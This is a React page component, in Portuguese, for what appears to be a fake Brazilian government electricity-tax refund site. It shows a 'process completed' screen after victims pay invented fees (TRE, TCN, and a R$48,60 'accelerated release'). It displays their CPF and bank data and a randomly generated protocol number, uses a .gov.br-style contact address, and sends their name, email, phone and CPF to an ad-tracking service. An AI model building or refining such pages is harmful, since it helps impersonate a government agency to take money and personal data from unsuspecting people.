import { useEffect, useState } from "react";
import { Link, useLocation } from "wouter";
import { CheckCircle2, Copy, Check, Home, Download, FileText, Database, CircleUser, CalendarClock } from "lucide-react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { useToast } from "@/hooks/use-toast";
import { sendPaymentConfirmedNotification } from "@/lib/utmify";
import GovHeader from "@/components/GovHeader";

export default function SucessoFinal() {
  // Hooks
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const params = new URLSearchParams(window.location.search);
  
  // Estados
  const [protocolo, setProtocolo] = useState("");
  const [dataEstimada, setDataEstimada] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [copiado, setCopiado] = useState(false);
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    email: "",
    telefone: "",
    valor: "0",
    companhia: "",
    estado: "",
    dataNascimento: "",
    banco: "",
    bancoNome: "",
    agencia: "",
    conta: "",
    pagamentoId: ""
  });
  
  // Tipo de processamento (acelerado ou normal)
  const tipoPagamento = params.get('tipo') || 'normal';
  
  // Copiar protocolo para área de transferência
  const copiarProtocolo = async () => {
    try {
      await navigator.clipboard.writeText(protocolo);
      setCopiado(true);
      toast({
        title: "Protocolo copiado!",
        description: "O número do protocolo foi copiado para a área de transferência.",
        duration: 3000,
      });
      setTimeout(() => setCopiado(false), 3000);
    } catch (err) {
      toast({
        variant: "destructive",
        title: "Erro ao copiar",
        description: "Não foi possível copiar o protocolo. Por favor, copie manualmente.",
        duration: 3000,
      });
    }
  };
  
  // Formatação de CPF
  const formatarCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };
  
  // Formatação de moeda
  const formatarMoeda = (valor: string | number) => {
    const numero = typeof valor === 'string' ? parseFloat(valor) : valor;
    return numero.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };
  
  // Formatação de telefone
  const formatarTelefone = (telefone: string) => {
    return telefone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
  };
  
  // Função para imprimir o comprovante
  const imprimirComprovante = () => {
    window.print();
  };
  
  // Carregar dados da solicitação
  useEffect(() => {
    if (!params.get('nome') || !params.get('cpf')) {
      setLocation("/");
      return;
    }
    
    // Gerar um protocolo aleatório
    const gerarProtocolo = () => {
      const data = new Date();
      const ano = data.getFullYear();
      const random = Math.floor(Math.random() * 900000) + 100000;
      const resultado = `${ano}${random}`;
      return resultado;
    };
    
    // Gerar data estimada (72 horas para pagamento normal, 1 hora para acelerado)
    const gerarDataEstimada = () => {
      // Garantir que temos uma data válida
      let dataPagamento: Date;
      
      try {
        const dataPagamentoStr = params.get('dataPagamento');
        dataPagamento = dataPagamentoStr ? new Date(dataPagamentoStr) : new Date();
      } catch (error) {
        // Fallback para data atual em caso de erro de parsing
        dataPagamento = new Date();
      }
      
      // Adicionar tempo correspondente ao tipo de pagamento
      const dataLimite = new Date(dataPagamento.getTime());
      
      if (tipoPagamento === 'acelerado') {
        // Para pagamento acelerado: 1 hora
        dataLimite.setHours(dataLimite.getHours() + 1);
      } else {
        // Para pagamento normal: 72 horas (3 dias)
        dataLimite.setHours(dataLimite.getHours() + 72);
      }
      
      return dataLimite.toLocaleDateString("pt-BR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      });
    };
    
    // Formatar data de pagamento
    const formatarDataPagamento = () => {
      const dataString = params.get('dataPagamento');
      if (!dataString) return new Date().toLocaleDateString("pt-BR");
      
      try {
        const data = new Date(dataString);
        return data.toLocaleDateString("pt-BR", {
          day: "2-digit",
          month: "2-digit",
          year: "numeric"
        });
      } catch (e) {
        return new Date().toLocaleDateString("pt-BR");
      }
    };
    
    // Organizar todos os dados da solicitação
    const dadosCompletos = {
      nome: params.get('nome') || "",
      cpf: params.get('cpf') || "",
      email: params.get('email') || "",
      telefone: params.get('telefone') || "",
      valor: params.get('valor') || "0",
      companhia: params.get('companhia') || "CEMIG Distribuição",
      estado: params.get('estado') || "Minas Gerais",
      dataNascimento: params.get('nasc') || "21/07/2003",
      banco: params.get('banco') || "bb",
      bancoNome: params.get('bancoNome') || "Banco do Brasil",
      agencia: params.get('agencia') || "",
      conta: params.get('conta') || "",
      pagamentoId: params.get('pagamento_id') || ""
    };
    
    // Atualizar estados
    setProtocolo(gerarProtocolo());
    setDataEstimada(gerarDataEstimada());
    setDataPagamento(formatarDataPagamento());
    setDadosSolicitacao(dadosCompletos);
    
    // Enviar notificação para UTMify sobre o pagamento confirmado
    // Só enviamos se tivermos um ID de pagamento válido
    if (dadosCompletos.pagamentoId && tipoPagamento === 'acelerado') {
      try {
        const valorEmCentavos = 4860; // R$ 48,60 em centavos
        
        sendPaymentConfirmedNotification(
          dadosCompletos.pagamentoId,
          {
            name: dadosCompletos.nome,
            email: dadosCompletos.email,
            phone: dadosCompletos.telefone,
            document: dadosCompletos.cpf
          },
          valorEmCentavos,
          undefined,
          "LAR" // Tipo de produto: LAR
        );
        
        console.log("Notificação de pagamento LAR confirmado enviada com sucesso para UTMify");
      } catch (error) {
        console.error("Erro ao enviar notificação LAR para UTMify:", error);
      }
    }
  }, [setLocation, tipoPagamento]);
  
  return (
    <>
      <GovHeader />
      <Header />
      <main className="bg-[var(--gov-gray-light)] min-h-screen py-10">
        <div className="container max-w-4xl mx-auto px-4">
          <div className="bg-white p-6 rounded-lg shadow-md">
            <div className="flex flex-col items-center justify-center text-center space-y-4 mb-8">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                <CheckCircle2 className="w-10 h-10 text-green-600" />
              </div>
              <h1 className="text-2xl md:text-3xl font-bold text-[var(--gov-blue-dark)]">
                Processo Concluído com Sucesso!
              </h1>
              <p className="text-[var(--gov-gray-dark)] max-w-xl">
                <span className="font-medium">{dadosSolicitacao.nome.split(" ")[0]}</span>,
                {tipoPagamento === 'acelerado' 
                  ? ' sua restituição está em processamento acelerado para pagamento prioritário.' 
                  : ' sua solicitação de restituição foi registrada e confirmada.'}
              </p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
              <Card className="border-green-200 shadow-sm h-full">
                <CardHeader className="bg-green-50 border-b border-green-200">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-green-800 flex items-center gap-2">
                      <Database className="h-5 w-5" /> Dados da Solicitação
                    </CardTitle>
                    <Badge variant="outline" className="bg-green-100 text-green-800 border-green-300">
                      CONFIRMADO
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4 pt-6">
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Número do Protocolo:</span>
                    <div className="flex items-center gap-2">
                      <span className="font-semibold text-[var(--gov-blue-dark)]">{protocolo}</span>
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        className="h-6 w-6" 
                        onClick={copiarProtocolo}
                      >
                        {copiado ? (
                          <Check className="h-4 w-4 text-green-600" />
                        ) : (
                          <Copy className="h-4 w-4 text-gray-500" />
                        )}
                      </Button>
                    </div>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Status:</span>
                    <span className="text-sm bg-blue-100 text-blue-800 px-3 py-1 rounded-full font-medium">
                      {tipoPagamento === 'acelerado' ? 'Processamento acelerado' : 'Em análise'}
                    </span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Data do Pagamento:</span>
                    <span className="text-[var(--gov-gray-dark)]">
                      {dataPagamento}
                    </span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Valor da Restituição:</span>
                    <span className="text-green-600 font-semibold">{formatarMoeda(dadosSolicitacao.valor)}</span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Companhia:</span>
                    <span className="text-[var(--gov-gray-dark)]">{dadosSolicitacao.companhia}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Previsão de Pagamento:</span>
                    <span className="text-[var(--gov-gray-dark)]">Até {dataEstimada}</span>
                  </div>
                </CardContent>
              </Card>

              <Card className="border-blue-200 shadow-sm h-full">
                <CardHeader className="bg-blue-50 border-b border-blue-200">
                  <CardTitle className="text-blue-800 flex items-center gap-2">
                    <CircleUser className="h-5 w-5" /> Dados Pessoais
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4 pt-6">
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Nome Completo:</span>
                    <span className="text-[var(--gov-gray-dark)] font-medium">{dadosSolicitacao.nome}</span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">CPF:</span>
                    <span className="text-[var(--gov-gray-dark)] font-medium">{formatarCPF(dadosSolicitacao.cpf)}</span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Data de Nascimento:</span>
                    <span className="text-[var(--gov-gray-dark)]">{dadosSolicitacao.dataNascimento}</span>
                  </div>

                  <div className="flex justify-between items-center">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Estado:</span>
                    <span className="text-[var(--gov-gray-dark)]">{dadosSolicitacao.estado}</span>
                  </div>
                </CardContent>
              </Card>
            </div>

            <Card className="shadow-sm mb-8">
              <CardContent className="pt-6">
                <div className="w-full flex flex-col sm:flex-row gap-3 justify-between">
                  <Button variant="outline" className="gap-2" onClick={imprimirComprovante}>
                    <Download className="h-4 w-4" />
                    Salvar Comprovante
                  </Button>
                  <Button variant="outline" className="gap-2" onClick={() => window.open(`mailto:contato@restituicao-icms.gov.br?subject=Consulta%20Protocolo%20${protocolo}`)}>
                    <FileText className="h-4 w-4" />
                    Acompanhar Solicitação
                  </Button>
                </div>
              </CardContent>
            </Card>

            <Card className="mb-8">
              <CardHeader className="bg-blue-50 border-b border-blue-200">
                <CardTitle className="text-blue-800 flex items-center gap-2">
                  <CalendarClock className="h-5 w-5" /> Cronograma de Processamento
                </CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                <div className="space-y-8">
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-green-500 text-white flex items-center justify-center">1</div>
                      <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                    </div>
                    <div className="pb-6">
                      <h3 className="text-lg font-medium text-green-700">Pagamento da TRE</h3>
                      <p className="text-gray-600">Concluído em {dataPagamento}</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Taxa de Regularização Energética (TRE) confirmada e processada.
                      </p>
                    </div>
                  </div>
                  
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-green-500 text-white flex items-center justify-center">2</div>
                      <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                    </div>
                    <div className="pb-6">
                      <h3 className="text-lg font-medium text-green-700">Pagamento da TCN</h3>
                      <p className="text-gray-600">Concluído em {dataPagamento}</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Taxa de Conformidade Nacional (TCN) confirmada e termo de conformidade emitido.
                      </p>
                    </div>
                  </div>
                  
                  {tipoPagamento === 'acelerado' ? (
                    <div className="flex">
                      <div className="flex flex-col items-center mr-4">
                        <div className="rounded-full h-8 w-8 bg-green-500 text-white flex items-center justify-center">3</div>
                        <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                      </div>
                      <div className="pb-6">
                        <h3 className="text-lg font-medium text-green-700">Liberação Acelerada</h3>
                        <p className="text-gray-600">Concluído em {dataPagamento}</p>
                        <p className="mt-1 text-sm text-gray-500">
                          Liberação Acelerada de Restituição (LAR) confirmada para processamento prioritário.
                        </p>
                      </div>
                    </div>
                  ) : (
                    <div className="flex">
                      <div className="flex flex-col items-center mr-4">
                        <div className="rounded-full h-8 w-8 bg-gray-300 text-white flex items-center justify-center">3</div>
                        <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                      </div>
                      <div className="pb-6">
                        <h3 className="text-lg font-medium text-gray-500">Processamento Normal</h3>
                        <p className="text-gray-400">Sem aceleração</p>
                        <p className="mt-1 text-sm text-gray-500">
                          Processamento seguirá o fluxo normal, sem prioridade na fila.
                        </p>
                      </div>
                    </div>
                  )}
                  
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-blue-500 text-white flex items-center justify-center">4</div>
                      <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                    </div>
                    <div className="pb-6">
                      <h3 className="text-lg font-medium text-[var(--gov-blue-dark)]">Análise Documental</h3>
                      <p className="text-blue-600 font-medium">Em andamento</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Seus documentos estão sendo analisados para confirmação final.
                        <span className="block mt-1">
                          {tipoPagamento === 'acelerado' 
                            ? 'Tempo estimado: até 30 minutos' 
                            : 'Tempo estimado: até 3 dias úteis'}
                        </span>
                      </p>
                    </div>
                  </div>
                  
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-gray-300 text-white flex items-center justify-center">5</div>
                    </div>
                    <div>
                      <h3 className="text-lg font-medium text-gray-500">Pagamento</h3>
                      <p className="text-gray-400">Aguardando etapas anteriores</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Transferência do valor de {formatarMoeda(dadosSolicitacao.valor)}.
                        <span className="block mt-1">Previsão: até {dataEstimada}</span>
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <div className="space-y-6">
              <div className="p-6 bg-blue-50 rounded-lg border border-blue-200">
                <h2 className="font-semibold text-lg text-blue-800 mb-3">Informações Importantes</h2>
                <div className="space-y-3 text-blue-700">
                  <p>
                    <span className="font-medium">• Acompanhamento:</span> Você receberá atualizações por e-mail sobre o status da sua solicitação.
                  </p>
                  <p>
                    <span className="font-medium">• Documentação:</span> Caso seja necessário enviar documentos adicionais, entraremos em contato.
                  </p>
                  <p>
                    <span className="font-medium">• Prazo:</span> O tempo total estimado para conclusão do processo é de 
                    {tipoPagamento === 'acelerado' ? ' aproximadamente 1 hora.' : ' até 30 dias úteis.'}
                  </p>
                  <p>
                    <span className="font-medium">• Suporte:</span> Para dúvidas ou informações, utilize o protocolo {protocolo} como referência.
                  </p>
                </div>
              </div>
              
              <Separator />
              
              <div className="flex justify-center mt-6">
                <Link href="/">
                  <Button className="bg-[var(--gov-blue)]">
                    <Home className="mr-2 h-4 w-4" />
                    Voltar para a página inicial
                  </Button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}